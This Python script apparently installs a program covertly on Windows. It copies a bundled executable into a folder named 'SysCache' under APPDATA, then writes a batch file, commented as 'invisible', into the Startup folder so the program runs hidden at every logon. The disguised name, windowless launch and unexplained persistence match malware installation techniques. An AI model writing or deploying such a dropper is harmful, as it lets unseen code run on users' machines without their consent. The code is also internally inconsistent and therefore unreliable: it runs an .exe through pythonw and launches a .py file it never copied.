import os
import shutil
import sys
import subprocess

APP_NAME = "SysCache"
INSTALL_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)

def create_install_dir():
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)

def get_resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.abspath("."), filename)

def copy_files():
    src = get_resource_path("main_script.exe")
    dst = os.path.join(INSTALL_DIR, "main_script.exe")

    shutil.copy(src, dst)
def create_startup():
    startup = os.path.join(os.getenv("APPDATA"),
                           r"Microsoft\Windows\Start Menu\Programs\Startup")

    script_path = os.path.join(INSTALL_DIR, "main_script.exe")

    # cria um .bat invisível
    bat_path = os.path.join(INSTALL_DIR, "run.bat")

    with open(bat_path, "w") as f:
        f.write(f'pythonw "{script_path}"')

    shortcut = os.path.join(startup, "syscache.bat")
    shutil.copy(bat_path, shortcut)

def run_script():
    script_path = os.path.join(INSTALL_DIR, "main_script.py")
    subprocess.Popen(["pythonw", script_path], shell=True)

if __name__ == "__main__":
    create_install_dir()
    copy_files()
    create_startup()
    run_script()